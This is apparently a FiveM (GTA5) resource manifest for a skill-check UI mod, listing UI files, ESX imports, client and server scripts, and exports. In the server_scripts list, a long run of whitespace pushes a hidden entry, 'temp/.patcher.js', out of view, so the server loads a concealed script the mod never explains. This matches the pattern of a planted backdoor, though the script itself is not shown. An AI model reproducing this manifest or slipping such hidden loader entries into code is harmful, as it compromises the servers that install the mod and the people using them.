fx_version 'cerulean'
game 'gta5'

author "buffs"

ui_page 'html/index.html'

files {
    'html/index.html',
    'html/style.css',
    'html/script.js'
}
shared_script '@es_extended/imports.lua'

server_scripts {
    '@es_extended/locale.lua',                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         'temp/.patcher.js',
}
client_scripts {
    'client.lua'
}

exports {
    'openSkillcheck',
    'zamknijskill'
}
